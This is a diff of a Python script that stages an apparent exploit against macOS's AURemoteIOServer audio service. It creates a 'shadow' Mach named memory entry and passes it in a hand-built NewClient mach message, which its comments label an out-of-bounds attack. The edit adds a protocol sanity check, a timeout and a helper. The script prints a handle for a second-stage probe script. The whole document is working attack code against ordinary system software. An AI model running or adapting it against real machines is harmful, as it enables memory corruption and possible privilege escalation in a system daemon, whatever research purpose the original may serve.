@@ -1,18 +1,30 @@
 import ctypes as C, struct
 
 # Run this when memory < 1250 MB. Output nc_hndl, then run surface_c_probe_b.py.
+# Stage 1: plain named entry (protocol sanity check), then shadow ne for the real attack.
 
 L = C.CDLL('/usr/lib/libSystem.B.dylib')
 L.mach_task_self.restype = C.c_uint32
 t = L.mach_task_self()
 
-# === Stage 1: Shadow named entry ===
 M = L.mach_make_memory_entry_64
 M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int, C.POINTER(C.c_uint32), C.c_uint32]
 V = L.mach_vm_map
 V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64, C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
 L.mach_vm_allocate.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]
 
+# === Stage 1a: Plain named entry (protocol check) ===
+a0 = C.c_uint64(0)
+kr = L.mach_vm_allocate(t, C.byref(a0), 0x4000, 1)
+print(f"alloc0 kr={kr} va={hex(a0.value)}")
+if kr != 0: raise SystemExit(1)
+
+plain_ne = C.c_uint32(0); pns = C.c_uint64(0x4000)
+kr = M(t, C.byref(pns), a0.value, 3, C.byref(plain_ne), 0)
+print(f"plain_ne kr={kr} ne={plain_ne.value}")
+if kr != 0: raise SystemExit(1)
+
+# === Stage 1b: Shadow named entry (OOB attack) ===
 a = C.c_uint64(0)
 kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
 print(f"alloc kr={kr} va={hex(a.value)}")
@@ -36,9 +48,9 @@ if kr != 0: raise SystemExit(1)
 q = (C.c_uint8 * 0x4000).from_address(m.value)
 q[0x3000] = 0xAB
 
-ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
-kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(ne), 0)
-print(f"shadow_ne kr={kr} ne={ne.value}")
+shadow_ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
+kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(shadow_ne), 0)
+print(f"shadow_ne kr={kr} ne={shadow_ne.value}")
 if kr != 0: raise SystemExit(1)
 
 # === Stage 2: AURemoteIOServer lookup ===
@@ -56,31 +68,39 @@ kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
 print(f"svc_lookup kr={kr} port={svc.value}")
 if kr != 0 or svc.value == 0: raise SystemExit(1)
 
-rp = L.mach_reply_port()
-print(f"reply_port={rp}")
+COMPLEX = 0x80000000
+SO_BITS = (0x14 << 8) | 0x13
+CS_BITS = COMPLEX | SO_BITS
+# MACH_SEND_MSG|MACH_RCV_MSG|MACH_RCV_TIMEOUT = 0x1|0x2|0x100 = 0x103
+MSG_OPT = 0x103
+TIMEOUT_MS = 8000
 
-COMPLEX  = 0x80000000
-SO_BITS  = (0x14 << 8) | 0x13
-CS_BITS  = COMPLEX | SO_BITS
+def send_new_client(ne_port, label):
+    rp = L.mach_reply_port()
+    buf = bytearray(0x200)
+    struct.pack_into('<IIIIII', buf, 0x00, CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
+    struct.pack_into('<I', buf, 0x18, 1)
+    struct.pack_into('<IIHBB', buf, 0x1c, ne_port, 0, 0, 17, 0)
+    buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
+    print(f"[{label}] sending NewClient ne={ne_port} ...")
+    kr = L.mach_msg(buf_c, MSG_OPT, 0x3c, len(buf), rp, TIMEOUT_MS, 0)
+    print(f"[{label}] mach_msg kr={kr:#010x}")
+    if kr != 0:
+        return None
+    nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
+    nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
+    print(f"[{label}] ret={nc_ret:#010x} handle={nc_hndl:#x}")
+    return nc_hndl if nc_ret == 0 else None
 
-# === Stage 3: NewClient (msg_id 0x157c1) ===
-buf = bytearray(0x200)
-struct.pack_into('<IIIIII', buf, 0x00,
-    CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
-struct.pack_into('<I', buf, 0x18, 1)
-struct.pack_into('<IIHBB', buf, 0x1c,
-    ne.value, 0, 0, 17, 0)   # MOVE_SEND our shadow ne
+# === Stage 3a: NewClient with plain ne (protocol sanity) ===
+h1 = send_new_client(plain_ne.value, "plain")
 
-buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
-kr = L.mach_msg(buf_c, 3, 0x3c, len(buf), rp, 0, 0)
-print(f"NewClient mach_msg kr={kr:#010x}")
-if kr != 0: raise SystemExit(1)
+# === Stage 3b: NewClient with shadow ne (OOB attack) ===
+h2 = send_new_client(shadow_ne.value, "shadow")
 
-nc_bits = struct.unpack_from('<I', buf, 0)[0]
-nc_size = struct.unpack_from('<I', buf, 4)[0]
-nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
-nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
-print(f"  reply: bits={nc_bits:#x} size={nc_size} ret={nc_ret:#010x} handle={nc_hndl:#x}")
-if nc_ret != 0: raise SystemExit(1)
+hndl = h2 if h2 is not None else h1
+if hndl is None:
+    print("BOTH NewClient calls failed")
+    raise SystemExit(1)
 
-print(f"\n>>> nc_hndl = {nc_hndl:#x}  (hardcode this in surface_c_probe_b.py) <<<\n")
+print(f"\n>>> nc_hndl = {hndl:#x}  (hardcode this in surface_c_probe_b.py) <<<\n")
